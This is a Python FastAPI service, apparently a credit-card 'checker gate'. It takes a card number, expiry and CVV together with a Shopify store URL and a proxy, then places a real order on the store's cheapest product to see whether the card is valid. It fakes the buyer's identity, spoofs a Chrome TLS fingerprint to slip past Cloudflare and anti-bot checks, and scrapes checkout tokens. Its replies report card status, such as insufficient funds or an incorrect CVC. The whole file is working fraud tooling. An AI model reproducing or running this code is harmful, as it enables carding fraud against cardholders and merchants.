from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
import tls_client
import json
import re
import uuid
import random
import time
from html import unescape
from urllib.parse import urlparse, urlencode

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def safe_response(msg, price, gate="Shopify Master"):
    clean_msg = msg.replace("Proxy", "Prx").replace("proxy", "prx").replace("Connection", "Conn").replace("connection", "conn")
    clean_price = str(price).replace('$', '').strip() if price else "-"
    return {"Response": clean_msg, "Price": clean_price, "Gate": gate}

def fetch_product_stealth(session, store_url):
    """محرك سحب المنتجات الخفي"""
    endpoints = [f"{store_url}/products.json?limit=250", f"{store_url}/collections/all/products.json?limit=250"]
    for ep in endpoints:
        try:
            r = session.get(ep, timeout_seconds=10, insecure_skip_verify=True)
            if r.status_code == 200:
                data = r.json()
                products = data.get('products', []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                valid_variants = []
                for p in products:
                    for v in p.get('variants', []):
                        if v.get('available'):
                            try:
                                price = float(v.get('price', 0))
                                if price > 10000: price /= 100.0
                                if price > 0: valid_variants.append((str(v.get('id')), price))
                            except: pass
                if valid_variants:
                    valid_variants.sort(key=lambda x: x[1])
                    return valid_variants[0][0], "{:.2f}".format(valid_variants[0][1])
        except: continue

    # الضربة القاضية (البحث في الـ HTML)
    try:
        r = session.get(store_url, timeout_seconds=10, insecure_skip_verify=True)
        if r.status_code == 200:
            match = re.search(r'(?:variant_id|variantId)["\']?\s*:\s*["\']?(\d+)["\']?|variants\[0\]\.id\s*=\s*(\d+)|"id":(\d{13,15})', r.text, re.IGNORECASE)
            if match:
                vid = match.group(1) or match.group(2) or match.group(3)
                if vid: return str(vid), "1.00"
    except: pass
    return None, "-"

@app.get("/code/index.php")
def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    try:
        cc_parts = re.findall(r'\d+', cc.replace('|', ' '))
        if len(cc_parts) < 4: return JSONResponse(content=safe_response("Invalid CC Format", "-"))
        cc_num, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = url.rstrip('/')
        try: scope_host = urlparse(store_url).netloc or store_url.replace('https://', '').replace('http://', '').split('/')[0]
        except: scope_host = store_url.replace('https://', '').replace('http://', '').split('/')[0]
        
        proxy_str = format_proxy(proxy)
        proxies = {"http": proxy_str, "https": proxy_str} if proxy_str else None

        buyer = {
            "email": f"a.johnson{random.randint(10000,99999)}@gmail.com", "first_name": "Alexander", "last_name": "Johnson",
            "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
        }

        # هنا السحر: نفتح جلسة tls_client تنتحل شخصية Chrome 120 لكي يخاف Cloudflare ولا يحظرنا
        session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=True
        )
        if proxies: session.proxies = proxies

        # 1. سحب المنتج
        variant_id, price = fetch_product_stealth(session, store_url)
        if not variant_id: return JSONResponse(content=safe_response("No Valid Products Found", "-"))

        # 2. الإضافة للسلة
        add_headers = {"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/json", "Accept": "application/json"}
        add_payload = {"id": variant_id, "quantity": 1}
        add_res = session.post(f"{store_url}/cart/add.js", data=json.dumps(add_payload), headers=add_headers, insecure_skip_verify=True)
        
        if add_res.status_code not in [200, 201]: 
            return JSONResponse(content=safe_response("Anti-Bot Blocked Cart Add", price))

        time.sleep(0.5)

        # 3. فتح صفحة الدفع وتوليد التوكن بالقوة عبر POST Request
        chk_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        res_chk = session.post(f"{store_url}/cart", data="checkout=Checkout", headers=chk_headers, allow_redirects=True, insecure_skip_verify=True)
        html_chk = res_chk.text
        final_url = str(res_chk.url)

        if res_chk.status_code in [403, 429] or "cloudflare" in html_chk.lower() or "just a moment" in html_chk.lower():
            return JSONResponse(content=safe_response("Cloudflare WAF Blocked IP", price))
        
        if 'name="password"' in html_chk or "password-page" in html_chk:
            return JSONResponse(content=safe_response("Store is Password Protected", price))

        if "/cart" in final_url and "/checkout" not in final_url:
            return JSONResponse(content=safe_response("Store Automatically Emptied Cart", price))

        # 4. الرادار الجزيئي العميق للتوكن (Deep JWT Scanner)
        is_graphql = False
        session_token, classic_token, checkout_token = None, None, None

        # أ. استخراج Checkout Token من الرابط
        ct_match = re.search(r'/checkouts/(?:c|cn|unstable|c/graphql)/([^/?]+)', final_url)
        if ct_match: checkout_token = ct_match.group(1)

        # ب. البحث القاتل عن Session Token (يستحيل أن يهرب منه)
        meta_st = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', html_chk)
        if meta_st:
            is_graphql = True
            session_token = unescape(meta_st.group(1))
        else:
            # البحث عن أي رمز JWT (توكن شوبي فاي الحديث) داخل كامل كود الصفحة
            jwts = re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', html_chk)
            for jwt in jwts:
                if len(jwt) > 150: # توكن الجلسة يكون طويلاً جداً
                    is_graphql = True
                    session_token = jwt
                    break

        if is_graphql and not checkout_token:
            js_ct = re.search(r'["\']?checkoutToken["\']?\s*:\s*["\']([^"\']+)["\']', html_chk, re.IGNORECASE)
            if js_ct: checkout_token = js_ct.group(1)
            else: checkout_token = "unknown"

        # ج. البحث عن التوكن الكلاسيكي للمتاجر القديمة
        if not is_graphql:
            auth_match = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', html_chk)
            if auth_match: classic_token = unescape(auth_match.group(1))
            else:
                auth_match2 = re.search(r'value=["\']([^"\']+)["\'][^>]*?name=["\']authenticity_token["\']', html_chk)
                if auth_match2: classic_token = unescape(auth_match2.group(1))

        if not is_graphql and not classic_token:
            # لو فشل كل شيء، هذا المتجر يستخدم حماية خفية أو قالب Hydrogen
            return JSONResponse(content=safe_response("Token Hidden (React/Hydrogen Guard)", price))

        # 5. تشفير البطاقة داخل قبو شوبي فاي
        pci_headers = {"Origin": "https://checkout.pci.shopifyinc.com", "Content-Type": "application/json", "Accept": "application/json"}
        pci_payload = {"credit_card": {"number": cc_num, "month": int(mm), "year": int(yy), "verification_value": cvv, "name": buyer['first_name']}, "payment_session_scope": scope_host}
        res_pci = session.post("https://checkout.pci.shopifyinc.com/sessions", data=json.dumps(pci_payload), headers=pci_headers, insecure_skip_verify=True)
        
        if res_pci.status_code != 200:
            res_pci = session.post("https://deposit.us.shopifycs.com/sessions", data=json.dumps(pci_payload), headers=pci_headers, insecure_skip_verify=True)

        if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Tokenization Rejected", price))
        card_session_id = res_pci.json().get("id")

        # =================================================================
        # المسار الحديث: GraphQL Extensibility
        # =================================================================
        if is_graphql and session_token:
            if not checkout_token: checkout_token = "unknown"
            gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
            gql_headers = {
                'shopify-checkout-client': 'checkout-web/1.0', 'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
                'x-checkout-web-source-id': checkout_token, 'x-checkout-one-session-token': session_token, 'Content-Type': 'application/json'
            }
            merch_id = str(uuid.uuid4())
            addr_data = {"address1": buyer["address1"], "city": buyer["city"], "countryCode": buyer["country"], "firstName": buyer["first_name"], "lastName": buyer["last_name"], "zoneCode": buyer["province"], "postalCode": buyer["zip"], "phone": buyer["phone"]}
            
            # التفاوض (Proposal)
            prop_query = """query Proposal($delivery:DeliveryTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$sessionInput:SessionTokenInput!){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity}}){result{...on NegotiationResultAvailable{queueToken}}}}}"""
            prop_vars = {"delivery": {"deliveryLines": [{"destination": {"partialStreetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": True, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "payment": {"totalAmount": {"any": True}, "paymentLines": [], "billingAddress": {"streetAddress": addr_data}}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"]}, "sessionInput": {"sessionToken": session_token}}
            
            res_prop = session.post(gql_url, data=json.dumps({"operationName": "Proposal", "query": prop_query, "variables": prop_vars}), headers=gql_headers, insecure_skip_verify=True)
            queue_token = res_prop.json().get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('queueToken')
            
            if not queue_token: return JSONResponse(content=safe_response("Proposal Execution Failed", price))
            time.sleep(1)

            # الدفع الفعلي (SubmitForCompletion)
            sub_url = f"{store_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
            sub_query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){...on SubmitSuccess{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}...on SubmitRejected{errors{code localizedMessage}}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id}}}}}"""
            sub_vars = {"attemptToken": f"{checkout_token}-{uuid.uuid4().hex[:10]}", "input": {"sessionInput": {"sessionToken": session_token}, "queueToken": queue_token, "delivery": {"deliveryLines": [{"destination": {"streetAddress": addr_data}, "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]}, "deliveryMethodTypes": ["SHIPPING"], "destinationChanged": False, "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {"phone": buyer["phone"]}}, "expectedTotalPrice": {"any": True}}], "supportsSplitShipping": True}, "merchandise": {"merchandiseLines": [{"stableId": merch_id, "merchandise": {"productVariantReference": {"id": f"gid://shopify/ProductVariantMerchandise/{variant_id}", "variantId": f"gid://shopify/ProductVariant/{variant_id}"}}, "quantity": {"items": {"value": 1}}, "expectedTotalPrice": {"any": True}}]}, "payment": {"totalAmount": {"any": True}, "paymentLines": [{"paymentMethod": {"directPaymentMethod": {"paymentMethodIdentifier": "bfe4013b52b37df95b64c063a41da319", "sessionId": card_session_id, "billingAddress": {"streetAddress": addr_data}}}, "amount": {"any": True}}], "billingAddress": {"streetAddress": addr_data}}, "buyerIdentity": {"customer": {"presentmentCurrency": "USD", "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}}}
            
            res_sub = session.post(sub_url, data=json.dumps({"operationName": "SubmitForCompletion", "query": sub_query, "variables": sub_vars}), headers=gql_headers, insecure_skip_verify=True)
            sub_data = res_sub.json().get('data', {}).get('submitForCompletion', {})
            if sub_data.get('__typename') == 'SubmitRejected':
                errs = sub_data.get('errors', [])
                return JSONResponse(content=safe_response(errs[0].get('localizedMessage', 'System Rejected') if errs else 'System Rejected', price))
            
            receipt_id = sub_data.get('receipt', {}).get('id')
            if not receipt_id: return JSONResponse(content=safe_response("GraphQL Checkout Failed", price))

            # انتظار النتيجة
            poll_url = f"{store_url}/checkouts/unstable/graphql?operationName=PollForReceipt"
            poll_query = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...on ProcessedReceipt{id}...on FailedReceipt{processingError{...on PaymentFailed{code messageUntranslated}...on OrderCreationFailure{paymentsHaveBeenReverted}}}}}"""
            
            for _ in range(6):
                res_poll = session.post(poll_url, data=json.dumps({"operationName": "PollForReceipt", "query": poll_query, "variables": {"receiptId": receipt_id, "sessionToken": session_token}}), headers=gql_headers, insecure_skip_verify=True)
                if res_poll.status_code == 200:
                    p_type = res_poll.json().get('data', {}).get('receipt', {}).get('__typename')
                    if p_type == 'ProcessedReceipt': return JSONResponse(content=safe_response("Order completed 💎", price))
                    elif p_type == 'FailedReceipt':
                        err = res_poll.json().get('data', {}).get('receipt', {}).get('processingError', {}).get('code', 'DECLINED')
                        if "INSUFFICIENT" in err: return JSONResponse(content=safe_response("Insufficient Funds", price))
                        elif "CVC" in err: return JSONResponse(content=safe_response("Incorrect CVC", price))
                        elif "ZIP" in err or "ADDRESS" in err: return JSONResponse(content=safe_response("ZIP Code Mismatch", price))
                        elif "DO_NOT_HONOR" in err: return JSONResponse(content=safe_response("Do Not Honor", price))
                        return JSONResponse(content=safe_response(f"Declined: {err}", price))
                time.sleep(1.5)
            return JSONResponse(content=safe_response("Bank Timeout", price))

        # =================================================================
        # المسار الثاني: الكلاسيكي (HTML Forms)
        # =================================================================
        elif classic_token:
            addr_payload = {"_method": "patch", "authenticity_token": classic_token, "previous_step": "contact_information", "step": "shipping_method", "checkout[email]": buyer["email"], "checkout[shipping_address][first_name]": buyer["first_name"], "checkout[shipping_address][last_name]": buyer["last_name"], "checkout[shipping_address][address1]": buyer["address1"], "checkout[shipping_address][city]": buyer["city"], "checkout[shipping_address][country]": buyer["country"], "checkout[shipping_address][province]": buyer["province"], "checkout[shipping_address][zip]": buyer["zip"], "checkout[shipping_address][phone]": buyer["phone"]}
            res_addr = session.post(final_url, data=urlencode(addr_payload), headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=True, insecure_skip_verify=True)
            
            classic_token2 = classic_token
            match2 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_addr.text)
            if match2: classic_token2 = unescape(match2.group(1))
            
            res_ship = session.post(str(res_addr.url), data=urlencode({"_method": "patch", "authenticity_token": classic_token2, "previous_step": "shipping_method", "step": "payment_method"}), headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=True, insecure_skip_verify=True)
            
            gate_match = re.search(r'value=["\'](\d+)["\'][^>]*?name=["\']checkout\[payment_gateway\]["\']', res_ship.text)
            gateway_id = gate_match.group(1) if gate_match else "1"
            
            classic_token3 = classic_token2
            match3 = re.search(r'name=["\']authenticity_token["\'][^>]*?value=["\']([^"\']+)["\']', res_ship.text)
            if match3: classic_token3 = unescape(match3.group(1))

            pay_payload = {"_method": "patch", "authenticity_token": classic_token3, "previous_step": "payment_method", "step": "", "s": card_session_id, "checkout[payment_gateway]": gateway_id, "checkout[credit_card][vault]": "false", "complete": "1"}
            res_pay = session.post(str(res_ship.url), data=urlencode(pay_payload), headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=True, insecure_skip_verify=True)
            res_text = res_pay.text.lower()
            
            if "thank you" in res_text or "order completed" in res_text: return JSONResponse(content=safe_response("Order completed 💎", price))
            elif "insufficient" in res_text: return JSONResponse(content=safe_response("Insufficient Funds", price))
            elif "incorrect_cvc" in res_text or "security code" in res_text: return JSONResponse(content=safe_response("Incorrect CVC", price))
            elif "zip code" in res_text or "avs" in res_text: return JSONResponse(content=safe_response("ZIP Code Mismatch", price))
            else:
                err = re.search(r'class="field__message field__message--error">([^<]+)<', res_pay.text)
                return JSONResponse(content=safe_response(err.group(1).strip() if err else "Declined by Payment Gate", price))

        return JSONResponse(content=safe_response("Store Architecture Unrecognized", price))

    except Exception as e:
        return JSONResponse(content=safe_response(f"Sys_Err: {str(e)[:40]}", "-"))
